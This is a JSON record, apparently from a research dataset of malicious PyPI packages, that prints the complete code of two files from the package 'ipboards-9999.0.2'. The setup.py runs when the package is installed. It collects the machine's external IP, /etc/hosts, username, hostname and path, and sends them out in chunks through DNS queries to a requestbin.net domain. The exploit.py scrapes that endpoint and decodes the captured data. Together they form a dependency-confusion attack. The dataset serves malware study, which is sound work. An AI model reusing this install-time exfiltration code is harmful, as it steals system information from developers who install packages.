[
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/ipboards-9999.0.2/ipboards-9999.0.2/setup.py",
    "malicious_code": "import dns.resolver\nimport getpass\nimport requests\nimport uuid\nfrom binascii import hexlify\nimport socket\nimport os\nimport time\n\ndnss = \".b0a0374cd1cb4305002e.d.requestbin.net\"\npackagename = \"ipboard\"\nuuidOne = str(uuid.uuid1())[0:8]\ndnss = '.' + uuidOne + dnss\nip = requests.get('http://ip.42.pl/raw').text\n\n#username,hostname,external_IP,time,path,package_name\nf = open(\"/etc/hosts\", \"r\")\nhostFile = f.read()\nusername = getpass.getuser()\nhostname = socket.gethostname()\nnow = int(time.time())\npath = os.path.dirname(os.path.abspath(__file__))\npayload = ip + ';' + username + ';' + hostname + ';' + str(now) + ';' + path + ';' + packagename + ';' + hostFile\ntry:\n    payload = hexlify(bytes(payload, encoding='utf8'))\nexcept:\n    payload = hexlify(bytes(payload))\n\nchunks = [payload[i:i+50] for i in range(0, len(payload), 50)]\n\nfor pd in chunks:\n    dns.resolver.query(pd.decode(\"utf-8\") + dnss, 'A')"
  },
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/ipboards-9999.0.2/ipboards-9999.0.2/exploit.py",
    "malicious_code": "from selenium import webdriver\nfrom time import sleep\nimport re\n\nchromedriver = '/home/geeky-cat/Desktop/HackTheBox/depConfusion/pythonlib/chromedriver'\n \noptions = webdriver.ChromeOptions()\noptions.add_argument('headless')\noptions.add_argument('window-size=1200x600')\n \nbrowser = webdriver.Chrome(executable_path=chromedriver, chrome_options=options)\n \nbrowser.get('https://requestbin.net/dns?master=b0a0374cd1cb4305002e')\nsleep(5)\nspanelement=browser.find_element_by_class_name('list-group').text\ndata=re.sub(r'TIME.*', '', spanelement)\ndata=re.sub(r'FROM.*', '', data)\ndata=re.sub(r'DATA.*', '', data)\ndata=re.sub(r'\\..*', '', data)\ndata=re.sub(r'____FINISHED____.*', '', data)\ndata=re.sub(r'\\n', '', data)\ndecoded=bytearray.fromhex(data).decode() \nprint(decoded)"
  }
]